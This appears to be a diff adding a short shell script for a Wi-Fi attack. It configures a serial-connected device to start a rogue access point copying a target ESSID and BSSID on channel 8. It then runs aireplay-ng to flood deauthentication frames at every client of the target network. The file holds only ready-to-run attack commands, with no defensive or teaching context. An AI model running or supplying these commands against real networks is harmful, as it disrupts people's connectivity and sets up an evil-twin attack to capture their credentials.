@@ -1,0 +1,18 @@
+stty -F /dev/ttyUSB0 raw speed 115200
+echo -ne "TARGET:ESSID|BSSID|8\n" > /dev/ttyUSB0
+echo -ne "AI_STOP\n" > /dev/ttyUSB0  
+echo -ne "CHAN_PATTERN:0\n" > /dev/ttyUSB0 
+echo -ne "START_AP\n" > /dev/ttyUSB0
+
+
+sudo lsof /dev/ttyUSB0
+
+
+
+screen /dev/ttyUSB0 115200
+
+
+##################### FOR DEAUTH ##########################
+sudo iwconfig fluxwl0 channel 8
+
+sudo aireplay-ng -0 60 -a target_BSSID -c FF:FF:FF:FF:FF:FF fluxwl0  --ignore-negative-one
